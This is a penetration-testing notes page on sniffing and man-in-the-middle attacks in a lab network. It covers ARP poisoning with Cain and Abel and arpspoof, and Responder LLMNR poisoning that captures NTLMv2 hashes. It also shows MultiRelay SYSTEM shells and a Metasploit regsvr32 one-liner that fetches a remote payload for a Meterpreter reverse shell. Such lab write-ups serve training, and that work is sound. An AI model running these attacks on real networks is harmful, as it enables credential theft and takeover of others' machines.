---
layout: default
title: Sniffing and MITM
nav_order: 6
---

# Sniffing and MITM

---

## Cain and Abel

Click _Start/Stop Sniffer_

![start](../../../assets/images/ctfs/proving_grounds/sniffing/start.png)

Discovered hosts appear in the _Sniffer_ tab

![hosts](../../../assets/images/ctfs/proving_grounds/sniffing/hosts.png)

### Arp Poisoning

From the _APR_ tab select the top table area and then the _plus_ icon to start an ARP Poisoning attack.

![plus](../../../assets/images/ctfs/proving_grounds/sniffing/plus.png)

Select the target on the left (172.16.2.5) and the default gateway (172.16.5.1) on the right.

![target1](../../../assets/images/ctfs/proving_grounds/sniffing/target1.png)

Repeat this process until all the hosts for the ARP Poisoning attack have been populated.

![table](../../../assets/images/ctfs/proving_grounds/sniffing/table.png)

Click the start button to begin the ARP attack

![start2](../../../assets/images/ctfs/proving_grounds/sniffing/start2.png)

![attack](../../../assets/images/ctfs/proving_grounds/sniffing/attack.png)

Stop the attack by clicking the _Sniffer_ and _ARP_ buttons

Click the _passwords_ tab to see the captured passwords

![password](../../../assets/images/ctfs/proving_grounds/sniffing/password.png)

Click on the _smb_ filter and right-click > _send to cracker_ to crack captured hashes

![crack](../../../assets/images/ctfs/proving_grounds/sniffing/crack.png)

Click the _Cracker_ tab and then right-click > _dictionary attack_

![dictionary](../../../assets/images/ctfs/proving_grounds/sniffing/dictionary.png)

Right-click on the _Dictionary Table_ and select _Add to List_

![list](../../../assets/images/ctfs/proving_grounds/sniffing/list.png)

Select the wordlist and then the _start_ button; after awhile the cracked password should appear.

![cracked](../../../assets/images/ctfs/proving_grounds/sniffing/cracked.png)

Select the _Network_ tab and click _Quick List_ and then _Add to Quick List_

![quick](../../../assets/images/ctfs/proving_grounds/sniffing/quick.png)

Connect to the server

![connect](../../../assets/images/ctfs/proving_grounds/sniffing/connect.png)

Right-click on _Services_ and install _Abel_

![abel](../../../assets/images/ctfs/proving_grounds/sniffing/abel.png)

Double click on the server and _Abel_ should appear where we can run commands from the console.

![whoami](../../../assets/images/ctfs/proving_grounds/sniffing/whoami.png)

## Arpspoof: Capture Traffic Between Hosts

Consider the following diagram:

![network](../../../assets/images/ctfs/proving_grounds/sniffing/network.png)

To sniff traffic between 172.16.5.5 and 172.16.5.1 we can do the following:

1. Start Wireshark and collect all traffic on a given interface (eth1 in this example)
2. Enable IP forwarding

To enable IP forwarding do the following:

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ echo 1 > /proc/sys/net/ipv4/ip_forward

```

Then, use _arpspoof_ to tell the target 172.16.5.5 everytime it needs to communicate with 172.16.5.1 it needs to pass through the attack machine.

We need to run the command both directions, eachone in a separate terminal.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ arpspoof -i eth1 -t 172.16.5.5 -r 172.16.5.1
8:0:27:d4:ee:5d 8:0:27:8a:4b:36 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8a:4b:36 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ arpspoof -i eth1 -t 172.16.5.1 -r 172.16.5.5
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8a:4b:36 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8a:4b:36 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8a:4b:36 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d


```

Finally, we launch the attack using _driftnet_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ driftnet -i eth1

```

Soon we start capturing information between the two hosts

We can analyze the traffic in Wireshark.

## MiTM with Responder

Using the _Responder_ and _MultiRelay_ tools we can perform a MiTM attack and obtain a shell on the target.

We being by launching _Responder_ to conduct an NTLM downgrade attack on the target.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ responder -I eth1 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 172.16.5.25 for name INE-LABServer-51
[*] [LLMNR]  Poisoned answer sent to 172.16.5.25 for name ine-labserver-51
[*] [LLMNR]  Poisoned answer sent to 172.16.5.25 for name ine-labserver-51
[*] [LLMNR]  Poisoned answer sent to 172.16.5.25 for name wpad
[*] [LLMNR]  Poisoned answer sent to 172.16.5.25 for name ine-labserver-51
[*] [LLMNR]  Poisoned answer sent to 172.16.5.25 for name ine-labserver-51
[WebDAV] NTLMv2 Client   : 172.16.5.25
[WebDAV] NTLMv2 Username : domain\aline
[WebDAV] NTLMv2 Hash     : aline::domain:e6cf26144d668a3f:FCB1347FF0EE645CFD95E7E277F67727:01010000000000009077B53B230FD801F888AA286E3BFCE100000000020008004B004F004D005A0001001E00570049004E002D004F0030004E004D004300500034004500370031003600040014004B004F004D005A002E004C004F00430041004C0003003400570049004E002D004F0030004E004D0043005000340045003700310036002E004B004F004D005A002E004C004F00430041004C00050014004B004F004D005A002E004C004F00430041004C000800300030000000000000000100000000200000F5A787878A3C891CEAB2DE83C483319E9C2323C3F7134DD67EDD8ACD4E4C464E0A0010000000000000000000000000000000000009002A0048005400540050002F0069006E0065002D006C00610062007300650072007600650072002D00350031000000000000000000
[*] [LLMNR]  Poisoned answer sent to 172.16.5.25 for name INE-LABServer-52
[SMB] NTLMv2 Client   : 172.16.5.25
[SMB] NTLMv2 Username : domain\aline
[SMB] NTLMv2 Hash     : aline::domain:54b054764a68ecca:CFBE6ED8BFC9C8DA0E084DC20CC2A4F5:01010000000000004A3B253F230FD801B53B8E40CC81115100000000020000000000000000000000

```

We can see above that we have captured the NTLMv2 hash from client 172.16.5.25 on the _aline_ user.

We can retrieve the hash from _/usr/share/responder/logs_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ ls -la /usr/share/responder/logs

-rw-r--r-- 1 root root   942 Jan 21 19:02 SMB-NTLMv2-172.16.5.25.txt
-rw-r--r-- 1 root root  4711 Jan 21 19:02 WebDAV-NTLMv2-172.16.5.25.txt

```

The MultiRelay.py script uses *Runas.exe and *Syssvc.exe\* which are both x86-64 executables.

They are located in _/usr/share/responder/tools/MultiRelay/bin_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ ls -la /usr/share/responder/tools/MultiRelay/bin
total 260
drwxr-xr-x 2 root root   4096 May 30  2023 .
drwxr-xr-x 5 root root   4096 May 30  2023 ..
-rw-r--r-- 1 root root   3298 Jul 26  2022 Runas.c
-rwxr-xr-x 1 root root 123269 Feb  2  2023 Runas.exe
-rw-r--r-- 1 root root   2970 Jul 26  2022 Syssvc.c
-rwxr-xr-x 1 root root 120699 Feb  2  2023 Syssvc.exe

```

These need to be compiled so first remove the current _Runas.exe_ and _Syssvc.exe_ and output newly compiled versions.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ rm /usr/share/responder/tools/MultiRelay/bin/Runas.exe

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ rm /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ ls -la /usr/share/responder/tools/MultiRelay/bin

-rw-r--r-- 1 root root 3298 Apr 19  2021 Runas.c
-rw-r--r-- 1 root root 2970 Apr 19  2021 Syssvc.c

# Now compile fresh version of each
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ ls -la /usr/share/responder/tools/MultiRelay/bin

-rw-r--r-- 1 root root   3298 Apr 19  2021 Runas.c
-rwxr-xr-x 1 root root 109117 Jan 21 19:12 Runas.exe
-rw-r--r-- 1 root root   2970 Apr 19  2021 Syssvc.c
-rwxr-xr-x 1 root root 106519 Jan 21 19:12 Syssvc.exe

```

Now we can do the following to get a shell:

1. Run MultiRelay.py
2. Open a new termain and run Responder (again) which will spawn a shell in the above MultiRelay window

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ ./MultiRelay.py -t 172.16.5.10 -u ALL

Any other command than that will be run as SYSTEM on the target.

Connected to 172.16.5.10 as LocalSystem.
C:\Windows\system32\:#whoami
File size: 104.02KB
[================================================================================] 100.0%
Uploaded in: -0.981 seconds
nt authority\system

# Running Responder will result in a shell in the above MultiRelay window
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ responder -I eth1 --lm

```

Lastly, we can upgrade our MultiRelay shell to a Meterpreter shell

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/]
└─$ msfconsole -q
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set TARGET 3
msf6 exploit(multi/script/web_delivery) > set LHOST 172.16.5.101
msf6 exploit(multi/script/web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.5.101:4444
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/qS56SShcrpHeF7B
[*] Local IP: http://192.168.0.3:8080/qS56SShcrpHeF7B
[*] Server started.
[*] Run the following command on the target machine:
regsvr32 /s /n /u /i:http://172.16.5.101:8080/qS56SShcrpHeF7B.sct scrobj.dll
jobs

```

As we can see above, the following regsvr32 one-liner is provided to run in the MultiRelay shell.

_regsvr32 /s /n /u /i:http://172.16.5.101:8080/qS56SShcrpHeF7B.sct scrobj.dll_

```bash
C:\Windows\system32\:#regsvr32 /s /n /u /i:http://172.16.5.101:8080/qS56SShcrpHeF7B.sct scrobj.dll
File size: 104.02KB
[================================================================================] 100.0%
Uploaded in: -0.983 seconds
[+] Sharing violation, waiting a bit and attempting again.
[+] Something went wrong, try something else.

```

We should see the shell open in Metasploit

```bash
msf6 exploit(multi/script/web_delivery) >
[*] 172.16.5.10      web_delivery - Handling .sct Request
[*] 172.16.5.10      web_delivery - Delivering Payload (1900 bytes)
[*] Sending stage (175174 bytes) to 172.16.5.10
[*] Meterpreter session 1 opened (172.16.5.101:4444 -> 172.16.5.10:49160) at 2022-01-21 19:24:34 -0500

```

Now we can assume the session on the target that was passed from the MultiRelay shell to the Meterpreter shell

```bash
msf6 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : INE-LABSERVER
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```
